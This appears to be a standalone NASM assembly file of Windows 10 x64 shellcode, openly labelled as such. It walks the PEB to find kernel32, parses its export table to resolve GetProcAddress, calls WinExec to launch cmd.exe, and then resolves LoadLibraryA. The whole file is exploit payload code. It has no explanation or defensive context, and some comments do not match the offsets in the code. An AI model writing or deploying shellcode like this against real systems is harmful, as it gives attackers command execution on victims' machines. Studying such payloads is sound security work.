;Assembly language -> nasm x64  reffer (https://nasm.us/)
;Shellcode for Win10 x64 -> call command line
xor rcx, rcx                           ; RCX = 0                                  
mov rax, gs:[rcx + 0x60]               ; RAX = [TEB + 0x60] = &PEB                                 
mov rax, [rax + 0x18]                  ; RAX = [PEB + 0x18] = PEB_LDR_DATA                          
mov rsi, [rax + 0x20]                  ; RSI = [PEB_LDR_DATA + 0x10] = LDR_MODULE InLoadOrder[0] (process)                
lodsq                                  ; RAX = InLoadOrder[1] (ntdll)                     
xchg rax, rsi                          ; RAX = RSI, RSI = RAX                    
lodsq                                  ; RAX = InLoadOrder[2] (kernel32)                    
mov rbx, [rax + 0x20]                  ; RBX = [InLoadOrder[2] + 0x20] = kernel32 DllBase                      

xor r8, r8                             ; Clear r8                                 
mov r8d, [rbx + 0x3c]                  ; R8D = DOS->e_lfanew offset                
mov rdx, r8                            ; RDX = DOS->e_lfanew                      
add rdx, rbx                           ; RDX = PE Header                          
xor rcx, rcx                           ; RCX = 0                                  
mov cl, 0x88                           ; RCX = 0x88 - Offset export table         
add rcx, rdx                           ; RCX = PE Header + Offset export table
mov r8d, [rcx]                         ; R8D = Offset export table                
add r8, rbx                            ; R8 = Export table                        
xor rsi, rsi                           ; Clear RSI                               
mov esi, [r8 + 0x20]                   ; RSI = Offset namestable               
add rsi, rbx                           ; RSI = Names table                   
xor rcx, rcx                           ; RCX = 0 
mov r9, 0x41636f7250746547             ; R9 = AcorPteG                                  

;Get GetProcAddress Function
Get_Function:                                                                     
inc rcx                                ; Increment the ordinal                     
xor rax, rax                           ; RAX = 0                                  
mov eax, [rsi + rcx * 4]               ; Get name offset                           
add rax, rbx                           ; Get function name                        
cmp [rax], r9                          ; AcorPteG ?                                
jnz Get_Function                                                                   
xor rsi, rsi                           ; RSI = 0                                   
mov esi, [r8 + 0x24]                   ; ESI = Offset ordinals                    
add rsi, rbx                           ; RSI = Ordinals table                      
mov cx, [rsi + rcx * 2]                ; Number of function                        
xor rsi, rsi                           ; RSI = 0                                   
mov esi, [r8 + 0x1c]                   ; Offset address table                      
add rsi, rbx                           ; ESI = Address table                       
xor rdx, rdx                           ; RDX = 0                                   
mov edx, [rsi + rcx * 4]               ; EDX = Pointer(offset)                     
add rdx, rbx                           ; RDX = GetProcAddress                      
mov rdi, rdx                           ; RDI = GetProcAddress                

;Get WinExec Proc
push rdi							   ; GetProcAddress -> STACK
push rbx							   ; Kernel32 Dll Base -> STACK
mov rcx, 0x636578456e6957ff			   ; \xff,cexEniW
shr rcx, 8							   ; \x00,cexEniW
push rcx							   ; RCX -> STACK
mov rcx, rbx                           ; Kernel32 Dll Base [First]
mov rdx, rsp                           ; WinExec [Second]                          
sub rsp, 0x30						   ; RSP = RSP - 8*6                                                                                 
call rdi                               ; GetProcAddress   
add rsp, 0x30                          ; RSP = RSP + 8*6                                                              
add rsp, 0x8                           ; RSP = RSP + 8*1
mov rsi, rax                           ; RSI = WinExec
pop rbx								   ; RBX = GetProcAddress
pop rdi         					   ; RDI = Kernel32 Dll Base

;Call C:\Windows\System32\cmd.exe
push rsi							   ; WinExec -> STACK
push rdi							   ; Kernel32 Dll Base -> STACK
push rbx							   ; GetProcAddress -> STACK
mov rcx, 0x657865ffffffffff			   ; RCX = exe,\xff,\xff,\xff,\xff,\xff,\xff
shr rcx, 40							   ; RCX = \x00,\x00,\x00,\x00,\x00,exe
push rcx							   ; RCX -> STACK
mov rcx, 0x2e646d635c32336d			   ; RCX = .dmc\23m
push rcx                               ; RCX -> STACK
mov rcx, 0x65747379535c7377            ; RCX = etsyS\sw
push rcx							   ; RCX -> STACK
mov rcx, 0x6f646e69575c3a43            ; RCX = odniW\:C
push rcx							   ; RCX -> STACK
mov rcx, rsp						   ; RCX -> \x00,exe.dmc\23metsyS\swodniW\:C -> [First]
xor rdx, rdx						   ; 0 -> [Second] 
sub rsp, 0x30						   ; RSP = RSP - 8*6 
call rsi                               ; WinExec
add rsp, 0x30                          ; RSP = RSP + 8*6
add rsp, 0x20                          ; RSP = RSP + 8*4 
pop rbx								   ; RBX = GetProcAddress
pop rdi								   ; RDI = Kernel32 Dll Base
pop rsi								   ; RSI = WinExec

;Get LoadLibraryA Proc
push rsi							   ; WinExec -> STACK
push rdi							   ; Kernel32 Dll Base -> STACK
push rbx							   ; GetProcAddress -> STACK
mov ecx, 0x41797261                    ; RCX = \x00,\x00,\x00,\x00,Ayra                                      
push rcx                               ; RCX -> STACK                        
mov rcx, 0x7262694c64616f4c            ; RCX = rbiLdaoL                           
push rcx                               ; RCX -> STACK  
mov rcx, rbx                           ; RCX = Kernel32 Dll Base [First]                           
mov rdx, rsp                           ; RDX -> \x00,AyrarbiLdaoL [Second]                                          
sub rsp, 0x30						   ; RSP = RSP - 8*6                                                                     
call rdi                               ; GetProcAddress                            
add rsp, 0x30                          ; RSP = RSP + 8*6                                          
add rsp, 0x10                          ; RSP = RSP + 8*2       
mov r9, rax                            ; R9 = LoadLibraryA
pop rbx								   ; RBX = GetProcAddress
pop rdi								   ; RDI = Kernel32 Dll Base
pop rsi								   ; RSI = WinExec
ret
